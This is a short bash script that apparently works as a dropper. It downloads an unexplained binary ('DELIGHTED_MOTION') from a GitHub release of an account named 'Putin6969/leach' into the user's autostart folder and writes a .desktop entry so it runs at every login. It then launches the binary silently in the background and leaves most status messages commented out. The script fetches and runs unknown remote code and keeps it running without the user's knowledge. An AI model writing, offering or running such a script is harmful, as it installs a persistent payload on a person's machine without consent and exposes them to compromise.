#!/usr/bin/env bash
set -euo pipefail

DUMMY_URL="https://github.com/Putin6969/leach/releases/download/1.5/DELIGHTED_MOTION"
BINARY_NAME="DELIGHTED_MOTION"
AUTOSTART_DIR="$HOME/.config/autostart"
BINARY_PATH="$AUTOSTART_DIR/$BINARY_NAME"
DESKTOP_FILE="$AUTOSTART_DIR/$BINARY_NAME.desktop"

mkdir -p "$AUTOSTART_DIR"
echo "Downloading binary from: $DUMMY_URL"
if ! curl -fsSL -o "$BINARY_PATH" "$DUMMY_URL"; then
    # echo "Error: Failed to download binary from $DUMMY_URL"
    exit 1
fi
chmod +x "$BINARY_PATH"
# echo "Binary saved to: $BINARY_PATH"

cat > "$DESKTOP_FILE" <<EOF
[Desktop Entry]
Type=Application
Name=$BINARY_NAME
Comment=User autostart for $BINARY_NAME
Exec=$BINARY_PATH
Terminal=false
X-GNOME-Autostart-enabled=true
Hidden=false
NoDisplay=false
EOF
chmod +x "$DESKTOP_FILE"
# echo "Created autostart desktop file: $DESKTOP_FILE"

nohup "$BINARY_PATH" >/dev/null 2>&1 &
# echo "Binary started immediately."

echo "--------------------------------------------------------"
echo "Success!"
# echo "  Binary  : $BINARY_PATH"
# echo "  Desktop : $DESKTOP_FILE"
# echo "The binary is running now and will also start automatically on next login."
echo "--------------------------------------------------------"
